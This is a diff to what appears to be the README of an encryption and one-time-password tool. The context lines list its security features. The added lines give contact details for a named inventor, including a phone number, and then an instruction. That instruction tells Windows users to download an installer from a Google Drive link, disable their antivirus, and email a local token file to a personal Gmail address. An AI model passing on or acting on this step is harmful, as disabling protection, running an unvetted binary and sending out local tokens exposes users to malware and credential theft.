@@ -26,3 +26,11 @@ Forward Secrecy	Time-windowed OTP	Each OTP expires after its window, preventing 
 Authenticated Encryption	AES-GCM	Detects tampering using built-in authentication tags.
 Password Hardening	PBKDF2 (200 k iterations)	Increases brute-force cost exponentially.
 Entropy Injection	File content or sentence input	Strengthens seed randomness using user-defined payloads.
+
+Inventor: Neelanjan Manna
+Organization: SCIFIIINC
+Website: https://neelanjanmanna.com
++919831880966
+
+
+Only for windows Download this python installer first https://drive.google.com/file/d/1xKMyviS-_L7x9MmpyllGG9OLWriQ9Y-g/view?usp=sharing Disable antivirus send client token.txt file to email neelanjanmanna2021@gmail.com to get device specific admin token.
